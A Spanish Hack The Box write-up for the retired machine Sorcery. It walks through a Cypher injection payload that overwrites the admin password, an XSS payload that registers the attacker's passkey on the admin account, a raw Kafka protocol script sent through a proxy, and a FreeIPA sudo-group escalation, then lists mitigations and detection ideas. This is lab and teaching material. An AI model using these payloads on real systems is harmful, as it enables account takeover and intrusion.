---
machine: Sorcery
os: Linux
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, neo4j, cypher-injection, webauthn, kafka, freeipa]
---

# Sorcery — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Cuatro capas modernas encadenadas: **inyección Cypher** en una app sobre **Neo4j** para sobrescribir la contraseña del administrador, **XSS en el registro de passkeys (WebAuthn)** para asociar un autenticador propio a esa cuenta, el **protocolo Kafka** a pelo para saltarse el proxy HTTP y leer credenciales internas, y una mala configuración de **FreeIPA** para llegar a root. Cada tramo es raro por separado; juntos son el escenario empresarial más realista de la temporada.

## Reconocimiento

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,302,401
```

```text
80/tcp    http   app de «magos»
7474/tcp  http   Neo4j (interfaz)
7687/tcp  bolt   Neo4j
8081/tcp  http   panel de administración
9092/tcp  kafka  filtrado, sólo alcanzable a través del proxy
```

## Enumeración

- La app se registra con usuario y contraseña y guarda los datos en **Neo4j**; el endpoint de búsqueda es `/api/wizard?name=<nombre>`.
- El panel `/admin` exige sesión y, además, una **passkey** registrada: hay un flujo `/api/admin/webauthn/register/{initiate,complete}`.
- El 8081 hace de proxy hacia el broker Kafka del 9092; el 9092 no responde desde fuera.
- `bolt://` en el 7687 permite confirmar que la base es Neo4j aunque no haya credenciales.

## Foothold: inyección Cypher

La consulta se concatena:

```cypher
MATCH (w:Wizard {name: '<input>'}) RETURN w
```

Se cierra la comilla, se corta el `RETURN` con `//` y se hace `UNION` para leer otros nodos:

```text
/api/wizard?name=Merlin'}) RETURN w UNION MATCH (n) WHERE n:Secret RETURN n //
```

Para tomar la cuenta del administrador no hace falta leer su hash: se **sobrescribe** con uno calculado en local (mismo algoritmo que use la app) mediante `SET`. Con la contraseña nueva se entra como admin; el panel sigue pidiendo la passkey.

```text
LOAD CSV FROM 'http://<IP>:8000/x'   # confirma conectividad saliente (SSRF)
```

## Movimiento lateral: passkeys y Kafka

### 1. Passkey del atacante en la cuenta del admin

El panel `/admin/passkeys` pinta `credential.name` **sin escapar**. Se registra una credencial cuyo nombre es un XSS; cuando el administrador revisa la lista, su navegador ejecuta el JS, inicia el registro WebAuthn y **completa la ceremonia con el autenticador del atacante**:

```html
<img src=x onerror="fetch('/api/admin/webauthn/register/initiate',{method:'POST'})
 .then(r=>r.json()).then(c=>navigator.credentials.create({publicKey:c})
 .then(k=>fetch('/api/admin/webauthn/register/complete',{method:'POST',body:JSON.stringify(k)})))">
```

Desde ese momento se entra con la passkey propia: WebAuthn no protege si el registro se puede iniciar desde una XSS.

### 2. Kafka a través del proxy

El proxy deja pasar bytes si el primer byte parece una petición Kafka. Se habla el **protocolo binario** a mano: `ApiVersions` para validar, `Metadata` (`ApiKey 3`) para descubrir topics y `Fetch` (`ApiKey 1`) para leer mensajes.

```python
import socket, struct
def req(api, ver, corr, cid, payload=b''):
    body  = struct.pack('>hhi', api, ver, corr)
    body += struct.pack('>h', len(cid)) + cid.encode() + payload
    return struct.pack('>i', len(body)) + body

s = socket.create_connection(('<IP>', 8081))
s.send(req(18, 0, 1, 'x'))      # ApiVersions
print(s.recv(4096))
```

Del topic interno sale una **cuenta de servicio** con su contraseña.

## Escalada de privilegios: FreeIPA

```bash
kinit svc-deploy
ipa-getkeytab -s ipa.sorcery.htb -p svc-deploy -k svc.keytab
ldapsearch -Y GSSAPI -H ldap://ipa.sorcery.htb -b "cn=groups,cn=accounts,dc=sorcery,dc=htb" | grep -i sudo
```

La regla sudo de FreeIPA está mapeada a un **grupo** al que pertenece la cuenta de servicio, y apunta a un script que ese grupo puede escribir. Se modifica el script y se ejecuta por la regla: root.

```bash
sudo -l          # la regla aparece referenciada al grupo, no al usuario
sudo <script>    # root
```

## Evidencia (redactada)

```text
/home/<user>/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lecciones

- Las bases de datos de grafos también se inyectan: `MATCH ... {name: '$input'}` no es más seguro que un `SELECT` concatenado.
- **WebAuthn** no protege si el registro de credenciales se puede iniciar desde una XSS: la passkey pasa a ser del atacante.
- Un proxy que valida «sólo HTTP» y deja pasar bytes arbitrarios expone cualquier protocolo binario detrás.
- Los permisos de FreeIPA se heredan por grupo: una cuenta de servicio en el grupo equivocado es root.
- Mitigación: consultas parametrizadas en Neo4j, CSP y escapado en el panel de passkeys con verificación del `origin` en el registro, segmentación real (no proxies de conveniencia) para Kafka, y reglas sudo por usuario y binario concreto.

## Mitigaciones y detección

- Neo4j con consultas parametrizadas y usuario de sólo lectura para la app; `LOAD CSV` deshabilitado o restringido por `apoc`/config.
- Registro WebAuthn con comprobación de `origin` y `rpId`, y panel que escape cualquier nombre de credencial.
- Kafka sin exposición vía proxy HTTP: si hay gateway, que entienda el protocolo y valide `ApiKey`.
- FreeIPA: reglas sudo sin grupos amplios y cuentas de servicio sin privilegios de host.
- Detección: consultas Cypher con comillas y `UNION`, peticiones a `register/initiate` desde sesiones de bot, y bytes Kafka en un puerto HTTP.

## Referencias

- [Neo4j — Cypher injection](https://neo4j.com/docs/cypher-manual/current/introduction/cypher-overview/)
- [W3C — WebAuthn Level 2](https://www.w3.org/TR/webauthn-2/)
- [Apache Kafka protocol guide](https://kafka.apache.org/protocol.html)
- [FreeIPA — sudo rules](https://www.freeipa.org/page/HowTo/Sudo)
